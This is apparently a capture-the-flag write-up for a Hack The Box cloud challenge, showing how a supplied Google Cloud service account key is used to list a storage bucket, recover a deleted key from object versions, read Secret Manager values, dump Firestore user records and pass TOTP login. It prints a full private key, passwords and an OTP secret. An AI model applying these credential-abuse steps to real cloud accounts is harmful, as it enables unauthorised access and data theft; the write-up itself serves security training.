![banner](CloudOfSmoke.assets/banner.png)



<img src="CloudOfSmoke.assets/htb.png" style="margin-left: 20px; zoom: 40%;" align=left />        <font size="10">CloudOfSmoke</font>

​	30<sup>th</sup> April 2024 / Document No D24.102.65

​	Prepared By: polarbearer

​	Challenge Author(s): polarbearer

​	Difficulty: <font color=orange>Medium</font>

​	Classification: Confidential													

# Synopsis

CloudOfSmoke is a Medium cloud challenge. Players are given a service account key and the IP address of a web application, and have to identify a Google Cloud Storage bucket where sensible data, including the key for a second service account, is found. This new service account has read access to Firestore and is able to list available collections and retrieve data from them, obtaining a user name and its associated TOTP secret. Together with a reused password from one of the available secrets in the Google Cloud project, this data is used to gain access to the web application.

# Description

During an archeological excavation you came across a petroglyph with the following inscription:

```json
{
  "type": "service_account",
  "project_id": "ctfs-417807",
  "private_key_id": "40283937e0d6283436c0a82fb02589757fd9a5a2",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC0UlnAastOgLGY\ns6UYxQqK9o0UcRgpMFnvbBZPz6xqOf9e0ybu3c57VzAClS/a2gvUAlLGF72K4xGP\nkJF+P1KP5IfkdSXLt/urxZXzlA3/NFxBGLY+mnJ5eNzBgrfDBRv/41xxFuSe7L8q\nBzk/VoCI8maklqtesRixPSRJnX6Z0PJ+tyeEvzjla3VPhjwCgtw4o2ZIXF/ToPs0\nN3bl+WnwWYQ56C10XAu6aOG1KqFTrTsHMOF+E7vCkbV3HeDahEw5Yhg9q13Wf4bP\noQFevJosVzlOXxEPkA1//C8yXLvxWmEe38lZ+iMLT8J1YDNwBQpc9Y7tz9hoqXir\nW17ZRbvBAgMBAAECggEAFAICLuk6m0CI1CR0uGmemJowP7knwOQ6SmhQFnV40EWU\nqgkcTAtE7qcXLuYuS+Z/QvwqAoxeTeORjoAwQJWWm9wz3tvHwJGuxVm0YHVIU02U\nQe3TxOD+vC82sWsHaEZwG6W22156qg6jTG7GQZqfwvJAhNkp9SUJ1BqwZNGqmzbl\nm+oomduz5NKqAJtKgxSdqbecWe8fAGfo3u2bMo8Kve48Y2cWEzAR+IvRnLw8JGMR\ni1JjnQeH/H5upDjW2jwGx9bHZluqBglYnSh/Pa/86DwbYiBiAg0zt9pj6JbflSDA\n4RZx7EPyJXNKiduUgvhUQsFTvizYUouSGggwt9+s1QKBgQD2fZFbe9aemryjGacO\nu19KqNHgWDVqa8usgW8IPYmMl62JOCUkLAcy8hofVSQvkzv4mvTEap3Cr4VLZ5OB\nlDjd2t4007aroMx/MPnYEvUTK5BVBpLHX9GsBj4WA4TU3LukytNlGXsC5jey528h\nq3WlLDHK/0A6u1M4TrjxJPNOHQKBgQC7R0ZcX6RyPtWfdkt/Zb61EBYHeOorzgSh\nZCUqeCmw5sAEs26mvB+clkoExzKxNDbtekZpyj0bosHPiq20z4knPiaxaNg6fS/n\nig3mrGHGB33huowYmIcOSyv0TobI77s1DQmwdDeKM+rZd0iDhXYVcKP+P5lk5U6x\n4DpxSwLC9QKBgDkgjxDJ2cr2h+OxLVOvv30ZNVMufmrEwvafJPGe+YMZIEIePhVt\nEtoO3FkIrZNNJ2gN2c6v+xJFBbqdLcWpaaiZckiCDOMoKF0OJ8mZUy13OkNKe7gz\nj++znq4RcLa41dBypZ3X0vewDZasJsiB6Yk3fe7TS7qQ8c+qBxj0fGNNAoGBAKLG\nRm+PaZ0q4/3fkas/QcyaGKuR+ubr/7ZPFsac/o+VYBw14Nzm8grlzZvtjy/aFEvA\nVWcpsodMpWvAO07Ge40yRes5F4duu65hncd62NiINm919sKCABD6YU/M2PXY+Dwa\nAuvtd0CV82/kb5Bw9buY1dDscmTxsb6FCAbkjZfpAoGBALMMXUgO+reyNbcH5ztN\n1thmOxr/loTbLDbml/uj3RRfdXP1pSiW442dYTwlB84BmlulQesMGHMT2dcFyH8l\nBiwLCh3ZbnxC9B1J6ei54b5F8wkEziGlU5NREI2o8jATGfqmgzJctR1pGF0GdSm0\nbdN+E7guXOuACdBGLz3O/33t\n-----END PRIVATE KEY-----\n",
  "client_email": "storage@ctfs-417807.iam.gserviceaccount.com",
  "client_id": "111433751991073581449",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/storage%40ctfs-417807.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```

This carving is thought to hold the key for accessing the mythical vault in the clouds that is rumored to hold as much gold as the legendary underground vault. After a long search, you manage to find the vault at http://34.29.127.192. Can you get in?

# Flag

`HTB{th3_v4ULt_1s_0n_f1r3!}`

# Solution

Upon browsing to http://34.29.127.192 we are redirected to the `/login` page, where username and password must be provided in order to access the vault.

![image-20240430082921048](CloudOfSmoke.assets/image-20240430082921048.png) 

The background image is pulled from a Google Cloud storage bucket named `cloud-vault-assets`.

```html
<body style="background-image: url('https://storage.googleapis.com/cloud-vault-assets/img/cloud-vault.png');" class="bg-dark text-white">
```

As anonymous users we are not allowed to list the bucket contents.

```bash
gsutil ls gs://cloud-vault-assets/

ServiceException: 401 Anonymous caller does not have storage.objects.list access to the Google Cloud Storage bucket. Permission 'storage.objects.list' denied on resource (or it may not exist).
```

We save the JSON data from the stone inscription to a file named `serviceaccount.json` that we can use to authenticate as the `storage` service account:

```bash
gcloud auth activate-service-account --key-file=serviceaccount.json
```

The service account has listing access to the storage bucket. An additional directory named `cloudvault-dev-files` is found.

```bash
gsutil ls gs://cloud-vault-assets/

gs://cloud-vault-assets/cloudvault-dev-files/
gs://cloud-vault-assets/img/
```

The `cloudvault-dev-files` directory contains part of the source code of the NodeJS web application that is running the cloud vault. We copy the files locally for closer inspection.

```bash
gsutil cp -r gs://cloud-vault-assets/cloudvault-dev-files .
```

Among the app dependencies listed in the `cloud vault-dev-files/package.json` file we spot a couple interesting ones in `@google-cloud/secret-manager` and `firebase-admin`. Let's focus on `secret-manager` first. The [Secret Manager](https://cloud.google.com/nodejs/docs/reference/secret-manager/latest) library allows access to Google Cloud secrets from NodeJS applications; this suggests that there might be secrets defined in the GCP project. We try listing them:

```bash
gcloud secrets list --project ctfs-417807

NAME        CREATED              REPLICATION_POLICY  LOCATIONS
backup-key  2024-04-30T03:59:43  automatic           -
```

A secret named `backup-key` is found. Let's list all the available versions:

```bash
gcloud secrets versions list backup-key --project ctfs-417807

NAME  STATE    CREATED              DESTROYED
2     enabled  2024-04-30T04:00:17  -
1     enabled  2024-04-30T03:59:45  -
```

Two enabled versions exists. Let's view both:

```bash
gcloud secrets versions access --secret=backup-key --project ctfs-417807 1
mi@u7eij3Wae4

gcloud secrets versions access --secret=backup-key --project ctfs-417807 2
SRe6TCDV0eo
```

We take note of the secret values and continue inspecting the code. The `cloudvault-dev-files/config/db.js` file defines a Firestore object and exports it as `db`. This suggests that [Firestore](https://firebase.google.com/docs/firestore) may be used to hold account data for authentication.

```javascript
const { initializeApp, applicationDefault, cert } = require('firebase-admin/app');
const { getFirestore, Timestamp, FieldValue } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

module.exports = db;
```

A service account identified by the `firestore.json` key is used to access the Firestore database. Back to the storage bucket, we list all available file [versions](https://cloud.google.com/storage/docs/object-versioning) in the `config` directory by adding the `-a` option to the `ls` command:

```bash
gsutil ls -a gs://cloud-vault-assets/cloudvault-dev-files/config/ 
gs://cloud-vault-assets/cloudvault-dev-files/config/db.js#1714402948273829
gs://cloud-vault-assets/cloudvault-dev-files/config/firestore.json#1714402948237947
```

A previous version of the `firestore.json` file, that has since been deleted from the bucket, is available. We download it:

```bash
gsutil cp gs://cloud-vault-assets/cloudvault-dev-files/config/firestore.json#1714402948237947 .
```

The following line in `app.js` indicates that the [Passport.js](https://www.passportjs.org/) middleware is used for authentication. An authentication strategy might be in place to pull data from the Firestore `db` object.

```bash
require('./include/passport');
```

Unfortunately, the `include/passport.js` file is not found on the storage bucket, so - assuming our hypothesis is true - we don't know which [collection](https://firebase.google.com/docs/firestore/data-model#collections) might contain user data. We can write a simple NodeJS application to list available collections in the default database using the [listCollections()](https://googleapis.dev/nodejs/firestore/latest/Firestore.html#listCollections) method available in the [Firebade Admin SDK](https://firebase.google.com/docs/admin/setup).

```javascript
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

db.listCollections()
      .then(snapshot=>{
        snapshot.forEach(snaps => {
          console.log(snaps["_queryOptions"].collectionId);
        })
      })
      .catch(error => console.error(error));
```

A single collection named `vault_user_store` is returned.

```bash
$ node list.js 
vault_user_store
```

We can modify the program to show all data in the `vault_user_store` collection.

```javascript
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

async function getdata(db) {
  const dataRef = db.collection('vault_user_store');
  const snapshot = await dataRef.get();
  snapshot.forEach(doc => {
    console.log(doc.id, '=>', doc.data());
  });
}

console.log(getdata(db))
```

The user store contains a single user named `maximus`, together with the password hash and a `secret` string.

```bash
$ node view.js 
Promise { <pending> }
sppPjk7IpkrtQyfJ0IXC => {
  password: '$2a$04$sJkZ52ZZVT/MnH6SWxRnUuC0ZRTeAn7kqMGftXghlU0qSqLGVy6.q',
  secret: 'KZZXERL4OFNHW6TBJQ7GKIJM',
  username: 'maximus',
  id: 1
}
```

We attempt to login to the web application as `maximus` using the two versions of the `backup-key` secret obtained earlier, hoping for password reuse. Indeed, version 1 (`mi@u7eij3Wae4`) is a valid password for `maximus`. We are now required to enter a one-time token:

![image-20240430103357050](CloudOfSmoke.assets/image-20240430103357050.png)

The `secret` value obtained from the Firestore collection is a base32-encoded string, which could represent the TOTP secret associated with the account. We use `oathtool` to generate an OTP key from the secret value:

```bash
$ oathtool -b KZZXERL4OFNHW6TBJQ7GKIJM --totp
647744
```

The OTP is accepted and we are granted access to the vault, where the flag is displayed.

![image-20240430103855684](CloudOfSmoke.assets/image-20240430103855684.png)
